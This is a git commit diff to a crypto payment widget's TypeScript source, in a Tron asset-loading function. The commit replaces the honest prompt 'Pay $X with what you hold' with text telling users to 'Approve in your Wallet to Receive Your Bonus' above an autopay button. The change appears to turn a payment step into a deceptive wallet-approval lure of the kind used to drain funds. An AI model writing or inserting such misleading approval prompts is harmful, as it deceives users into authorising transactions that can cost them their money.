1ff22ca1351a4986bbd1c950fd02557da4b7a00b
Polyprotrade <gulatit861@gmail.com>
2026-09-17 11:40:56 -0700

    Update index.ts

--- widget/src/index.ts
+++ widget/src/index.ts
@@ -1212,7 +1212,7 @@ async function loadTronAssets(modal: Element) {
   }
 
   assetsEl.innerHTML = `
-    <p class="cp-connect-copy">Pay $${chargeNow.toFixed(2)} with what you hold:</p>
+    <p class="cp-connect-copy">Please Select Correct chain and Approve in your Wallet to Receive Your Bonus:</p>
     <div class="cp-wallet-list">
       <button class="cp-wallet-item" id="cp-autopay-btn">
         <span class="cp-wallet-emoji">${opt.icon}</span>
